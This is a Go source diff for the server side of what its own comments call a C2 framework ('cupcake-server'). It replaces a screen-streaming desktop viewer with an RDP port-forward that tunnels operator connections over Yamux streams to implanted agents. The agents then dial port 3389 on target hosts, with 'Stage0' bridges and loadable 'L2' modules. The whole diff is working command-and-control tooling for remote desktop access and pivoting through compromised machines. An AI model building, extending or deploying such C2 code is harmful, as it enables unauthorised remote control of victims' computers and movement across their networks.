@@ -1,86 +1,56 @@
 package services
 
 import (
-	"encoding/json"
 	"fmt"
 	"io"
 	"log"
 	"net"
+	"os"
+	"strconv"
+	"strings"
 	"sync"
 	"time"
 
+	"cupcake-server/pkg/globals"
 	"cupcake-server/pkg/utils"
 )
 
-// DesktopSession tracks one active desktop stream per agent (MVP: single viewer).
-type DesktopSession struct {
-	AgentID   string
-	Stream    net.Conn
-	Bucket    *utils.TokenBucket
-	OpenedAt  time.Time
-	MaxFps    int
-	MaxFrameB int
+// Desktop RDP connection protections.
+const (
+	// desktopRDPIdleTimeout closes a relay half after this long with no I/O.
+	desktopRDPIdleTimeout = 120 * time.Second
+	// desktopMaxConnsPerAgent caps concurrent mstsc→agent pipes per agent.
+	desktopMaxConnsPerAgent = 8
+	// desktopDefaultListenHost is loopback unless CUPCAKE_DESKTOP_LISTEN_HOST overrides.
+	desktopDefaultListenHost = "127.0.0.1"
+)
+
+// DesktopRdpSession is an RDP port-forward: C2 listens, each accept dials agent → target:3389
+// via Yamux DESKTOP (0x0D). Agent requires L2 module "desktop" Loaded (Stage0 thin bridge).
+type DesktopRdpSession struct {
+	AgentID    string
+	ListenHost string // e.g. "127.0.0.1"
+	ListenPort int    // actual bound port
+	TargetHost string // agent-side host (default 127.0.0.1)
+	TargetPort int    // agent-side port (default 3389)
+	Bind       string // full bind address used for Listen
+	OpenedAt   time.Time
+	listener   net.Listener
 }
 
 var (
-	desktopMu   sync.Mutex
-	desktopByID = map[string]*DesktopSession{}
+	desktopMu          sync.Mutex
+	desktopByID        = map[string]*DesktopRdpSession{}
+	desktopActiveConns = map[string]int{}
 )
 
-// DesktopBusyError means another viewer already holds the session.
+// DesktopBusyError means another RDP forward already holds this agent.
 var DesktopBusyError = fmt.Errorf("desktop busy")
 
-// TryReserveDesktop registers agent as busy **before** opening Yamux.
-// Returns release func to call if Open fails, or error if already busy.
-func TryReserveDesktop(agentID string) (release func(), err error) {
-	desktopMu.Lock()
-	defer desktopMu.Unlock()
-	if _, ok := desktopByID[agentID]; ok {
-		return nil, DesktopBusyError
-	}
-	// placeholder until stream attached
-	desktopByID[agentID] = &DesktopSession{
-		AgentID:   agentID,
-		OpenedAt:  time.Now(),
-		Bucket:    utils.NewTokenBucket(utils.DesktopDefaultMaxBps, time.Now().UnixMilli()),
-		MaxFps:    utils.DesktopDefaultMaxFps,
-		MaxFrameB: utils.DesktopDefaultMaxFrameBytes,
-	}
-	return func() {
-		desktopMu.Lock()
-		defer desktopMu.Unlock()
-		if s, ok := desktopByID[agentID]; ok && s.Stream == nil {
-			delete(desktopByID, agentID)
-		}
-	}, nil
-}
+// DesktopConnLimitError means too many concurrent RDP client connections for this agent.
+var DesktopConnLimitError = fmt.Errorf("desktop connection limit exceeded")
 
-// AttachDesktopStream binds the open Yamux stream to the reserved session.
-func AttachDesktopStream(agentID string, stream net.Conn) error {
-	desktopMu.Lock()
-	defer desktopMu.Unlock()
-	s, ok := desktopByID[agentID]
-	if !ok {
-		return fmt.Errorf("desktop not reserved")
-	}
-	s.Stream = stream
-	return nil
-}
-
-// ReleaseDesktop removes session (STOP / EOF / error). Idempotent.
-func ReleaseDesktop(agentID string) {
-	desktopMu.Lock()
-	defer desktopMu.Unlock()
-	if s, ok := desktopByID[agentID]; ok {
-		if s.Stream != nil {
-			_ = s.Stream.Close()
-			s.Stream = nil
-		}
-		delete(desktopByID, agentID)
-	}
-}
-
-// HasDesktopSession reports whether agent already has a desktop viewer.
+// HasDesktopSession reports whether agent already has an RDP forward open.
 func HasDesktopSession(agentID string) bool {
 	desktopMu.Lock()
 	defer desktopMu.Unlock()
@@ -88,113 +58,269 @@ func HasDesktopSession(agentID string) bool {
 	return ok
 }
 
-// OpenDesktopToAgent opens Yamux DESKTOP stream after busy check.
-// On success caller owns reading/writing until ReleaseDesktop.
-func OpenDesktopToAgent(agentID string) (net.Conn, error) {
-	release, err := TryReserveDesktop(agentID)
-	if err != nil {
-		return nil, err
+// GetDesktopSession returns a copy of the RDP session metadata (nil if none).
+func GetDesktopSession(agentID string) *DesktopRdpSession {
+	desktopMu.Lock()
+	defer desktopMu.Unlock()
+	s, ok := desktopByID[agentID]
+	if !ok {
+		return nil
+	}
+	cp := *s
+	cp.listener = nil
+	return &cp
+}
+
+// DesktopActiveConnCount returns current live client pipes for an agent (tests/diagnostics).
+func DesktopActiveConnCount(agentID string) int {
+	desktopMu.Lock()
+	defer desktopMu.Unlock()
+	return desktopActiveConns[agentID]
+}
+
+// resolveDesktopListenHost returns bind host: env CUPCAKE_DESKTOP_LISTEN_HOST or loopback.
+func resolveDesktopListenHost() string {
+	h := strings.TrimSpace(os.Getenv("CUPCAKE_DESKTOP_LISTEN_HOST"))
+	if h == "" {
+		return desktopDefaultListenHost
+	}
+	return h
+}
+
+// StartDesktopRDP starts a TCP listener and forwards accepted connections to
+// agent-side TargetHost:TargetPort (default 127.0.0.1:3389) via Yamux DESKTOP.
+// listenPort 0 = OS-assigned free port. Agent must have L2 module desktop Loaded.
+// Default bind is 127.0.0.1; set CUPCAKE_DESKTOP_LISTEN_HOST for external interfaces.
+func StartDesktopRDP(agentID, targetHost string, targetPort, listenPort int) (*DesktopRdpSession, error) {
+	if targetHost == "" {
+		targetHost = "127.0.0.1"
+	}
+	if targetPort <= 0 {
+		targetPort = 3389
+	}
+	if targetPort > 65535 {
+		return nil, fmt.Errorf("invalid target port")
+	}
+	if listenPort < 0 || listenPort > 65535 {
+		return nil, fmt.Errorf("invalid listen port")
 	}
 
-	session, ok := GetAgentSession(agentID)
+	// Require live Yamux session
+	val, ok := globals.Clients.Load(agentID)
 	if !ok {
-		release()
+		return nil, fmt.Errorf("agent offline")
+	}
+	client := val.(*globals.Client)
+	if client.YamuxSession == nil || client.YamuxSession.IsClosed() {
+		return nil, fmt.Errorf("no yamux session (need TCP agent)")
+	}
+
+	desktopMu.Lock()
+	if _, exists := desktopByID[agentID]; exists {
+		desktopMu.Unlock()
+		return nil, DesktopBusyError
+	}
+	// Hold reservation while we bind so concurrent Start cannot race
+	desktopByID[agentID] = &DesktopRdpSession{
+		AgentID:    agentID,
+		TargetHost: targetHost,
+		TargetPort: targetPort,
+		OpenedAt:   time.Now(),
+	}
+	desktopMu.Unlock()
+
+	listenHost := resolveDesktopListenHost()
+	bind := net.JoinHostPort(listenHost, strconv.Itoa(listenPort))
+	ln, err := net.Listen("tcp", bind)
+	if err != nil {
+		desktopMu.Lock()
+		delete(desktopByID, agentID)
+		desktopMu.Unlock()
+		return nil, fmt.Errorf("listen %s: %w", bind, err)
+	}
+
+	// Resolve actual port when listenPort was 0
+	actualPort := listenPort
+	if ta, ok := ln.Addr().(*net.TCPAddr); ok {
+		actualPort = ta.Port
+	}
+
+	sess := &DesktopRdpSession{
+		AgentID:    agentID,
+		ListenHost: listenHost,
+		ListenPort: actualPort,
+		TargetHost: targetHost,
+		TargetPort: targetPort,
+		Bind:       ln.Addr().String(),
+		OpenedAt:   time.Now(),
+		listener:   ln,
+	}
+
+	desktopMu.Lock()
+	desktopByID[agentID] = sess
+	desktopMu.Unlock()
+
+	go acceptDesktopRDP(agentID, ln, targetHost, targetPort)
+
+	log.Printf("[desktop-rdp] started agent=%s listen=%s → agent %s:%d",
+		agentID, ln.Addr().String(), targetHost, targetPort)
+	return sess, nil
+}
+
+// StopDesktopRDP closes the listener and removes the session. Idempotent.
+func StopDesktopRDP(agentID string) {
+	desktopMu.Lock()
+	s, ok := desktopByID[agentID]
+	if ok {
+		delete(desktopByID, agentID)
+	}
+	desktopMu.Unlock()
+	if !ok {
+		return
+	}
+	if s.listener != nil {
+		_ = s.listener.Close()
+	}
+	log.Printf("[desktop-rdp] stopped agent=%s", agentID)
+}
+
+// ReleaseDesktop is an alias kept for call sites / tests.
+func ReleaseDesktop(agentID string) {
+	StopDesktopRDP(agentID)
+}
+
+func acceptDesktopRDP(agentID string, ln net.Listener, targetHost string, targetPort int) {
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			// Listener closed or fatal
+			log.Printf("[desktop-rdp] accept end agent=%s: %v", agentID, err)
+			return
+		}
+		go handleDesktopRDPConn(agentID, conn, targetHost, targetPort)
+	}
+}
+
+// idleDeadlineConn resets read/write deadlines on every I/O so idle pipes die.
+type idleDeadlineConn struct {
+	net.Conn
+	idle time.Duration
+}
+
+func (c *idleDeadlineConn) Read(b []byte) (int, error) {
+	_ = c.Conn.SetReadDeadline(time.Now().Add(c.idle))
+	return c.Conn.Read(b)
+}
+
+func (c *idleDeadlineConn) Write(b []byte) (int, error) {
+	_ = c.Conn.SetWriteDeadline(time.Now().Add(c.idle))
+	return c.Conn.Write(b)
+}
+
+func handleDesktopRDPConn(agentID string, clientConn net.Conn, targetHost string, targetPort int) {
+	defer clientConn.Close()
+	remote := clientConn.RemoteAddr().String()
+	log.Printf("[desktop-rdp] client %s → agent %s %s:%d", remote, agentID, targetHost, targetPort)
+
+	// Still registered?
+	if !HasDesktopSession(agentID) {
+		return
+	}
+
+	// Per-agent concurrent connection cap
+	desktopMu.Lock()
+	if desktopActiveConns[agentID] >= desktopMaxConnsPerAgent {
+		desktopMu.Unlock()
+		log.Printf("[desktop-rdp] conn limit agent=%s remote=%s", agentID, remote)
+		return
+	}
+	desktopActiveConns[agentID]++
+	desktopMu.Unlock()
+	defer func() {
+		desktopMu.Lock()
+		desktopActiveConns[agentID]--
+		if desktopActiveConns[agentID] <= 0 {
+			delete(desktopActiveConns, agentID)
+		}
+		desktopMu.Unlock()
+	}()
+
+	stream, err := DialAgentDesktop(agentID, targetHost, uint16(targetPort))
+	if err != nil {
+		log.Printf("[desktop-rdp] dial agent failed %s: %v", agentID, err)
+		return
+	}
+	defer stream.Close()
+
+	// Idle timeout on both sides of the pipe
+	cIdle := &idleDeadlineConn{Conn: clientConn, idle: desktopRDPIdleTimeout}
+	sIdle := &idleDeadlineConn{Conn: stream, idle: desktopRDPIdleTimeout}
+
+	// Bidirectional pipe: mstsc ↔ yamux DESKTOP ↔ agent bridge ↔ RDP:3389
+	done := make(chan struct{}, 2)
+	go func() {
+		_, _ = io.Copy(sIdle, cIdle)
+		done <- struct{}{}
+	}()
+	go func() {
+		_, _ = io.Copy(cIdle, sIdle)
+		done <- struct{}{}
+	}()
+	<-done
+	_ = stream.Close()
+	_ = clientConn.Close()
+	<-done
+	log.Printf("[desktop-rdp] pipe closed %s agent=%s", remote, agentID)
+}
+
+// DialAgentDesktop opens a Yamux DESKTOP (0x0D) stream and asks the agent to
+// connect to host:port. Agent Stage0 bridge requires L2 module "desktop" Loaded.
+// Wire: type byte + [host_len u8][host][port u16 BE] + 1-byte ACK (0x01/0x00).
+func DialAgentDesktop(agentID, host string, port uint16) (net.Conn, error) {
+	if host == "" {
+		return nil, fmt.Errorf("empty host")
+	}
+	if len(host) > 255 {
+		return nil, fmt.Errorf("host too long")
+	}
+
+	val, ok := globals.Clients.Load(agentID)
+	if !ok {
+		return nil, fmt.Errorf("agent offline")
+	}
+	client := val.(*globals.Client)
+	session := client.YamuxSession
+	if session == nil || session.IsClosed() {
 		return nil, fmt.Errorf("no yamux session")
 	}
+
 	stream, err := session.Open()
 	if err != nil {
-		release()
-		return nil, err
+		return nil, fmt.Errorf("yamux open: %w", err)
 	}
+
+	// Type byte: DESKTOP data plane (agent desktop_bridge — module-gated)
 	if _, err := stream.Write([]byte{utils.YamuxStreamDesktop}); err != nil {
 		_ = stream.Close()
-		release()
-		return nil, err
+		return nil, fmt.Errorf("write stream type: %w", err)
 	}
-	if err := AttachDesktopStream(agentID, stream); err != nil {
+
+	// Target: [host_len u8][host][port u16 BE] (same framing as SOCKS target info)
+	sendTargetInfo(stream, host, strconv.Itoa(int(port)))
+
+	_ = stream.SetReadDeadline(time.Now().Add(30 * time.Second))
+	ack := make([]byte, 1)
+	if _, err := io.ReadFull(stream, ack); err != nil {
 		_ = stream.Close()
-		release()
-		return nil, err
+		return nil, fmt.Errorf("agent dial ack: %w", err)
+	}
+	_ = stream.SetReadDeadline(time.Time{})
+	if ack[0] != 0x01 {
+		_ = stream.Close()
+		return nil, fmt.Errorf(
+			"agent RDP dial failed to %s:%d (load L2 module 'desktop' first, or RDP not listening / firewalled)",
+			host, port,
+		)
 	}
 	return stream, nil
-}
-
-// DesktopAllowFrame applies per-stream size/bps limits.
-func DesktopAllowFrame(agentID string, frameBytes int) bool {
-	desktopMu.Lock()
-	s := desktopByID[agentID]
-	desktopMu.Unlock()
-	if s == nil {
-		return false
-	}
-	if frameBytes > s.MaxFrameB {
-		return false
-	}
-	return s.Bucket.Allow(int64(frameBytes), time.Now().UnixMilli())
-}
-
-// WriteDesktopHello sends HELLO JSON to agent.
-func WriteDesktopHello(w io.Writer, fps, quality, maxW int, encode string, maxBps int) error {
-	if encode == "" {
-		encode = "jpeg"
-	}
-	body, _ := json.Marshal(map[string]interface{}{
-		"fps":      fps,
-		"quality":  quality,
-		"max_w":    maxW,
-		"encode":   encode,
-		"monitor":  0,
-		"max_bps":  maxBps,
-	})
-	msg, err := utils.EncodeDesktopMessage(utils.DesktopMsgHello, 0, body)
-	if err != nil {
-		return err
-	}
-	_, err = w.Write(msg)
-	return err
-}
-
-// WriteDesktopStop sends STOP frame.
-func WriteDesktopStop(w io.Writer) error {
-	msg, err := utils.EncodeDesktopMessage(utils.DesktopMsgStop, 0, []byte("{}"))
-	if err != nil {
-		return err
-	}
-	_, err = w.Write(msg)
-	return err
-}
-
-// PumpDesktopAgentToAdmin copies agent frames to admin writer with rate limit.
-// Stops on error/EOF; always ReleaseDesktop.
-func PumpDesktopAgentToAdmin(agentID string, agent net.Conn, admin io.Writer) {
-	defer ReleaseDesktop(agentID)
-	hdr := make([]byte, utils.DesktopHeaderLen)
-	for {
-		if _, err := io.ReadFull(agent, hdr); err != nil {
-			return
-		}
-		env, err := utils.ParseDesktopHeader(hdr)
-		if err != nil {
-			if err == utils.ErrDesktopSilentClose {
-				log.Printf("[desktop] agent %s silent close parse", agentID)
-			}
-			return
-		}
-		payload := make([]byte, env.PayloadLen)
-		if env.PayloadLen > 0 {
-			if _, err := io.ReadFull(agent, payload); err != nil {
-				return
-			}
-		}
-		frameLen := utils.DesktopHeaderLen + int(env.PayloadLen)
-		if env.MsgType == utils.DesktopMsgFrame && !DesktopAllowFrame(agentID, frameLen) {
-			// drop frame under rate limit
-			continue
-		}
-		// re-encode same envelope to admin
-		msg := append(append([]byte{}, hdr...), payload...)
-		if _, err := admin.Write(msg); err != nil {
-			return
-		}
-	}
 }
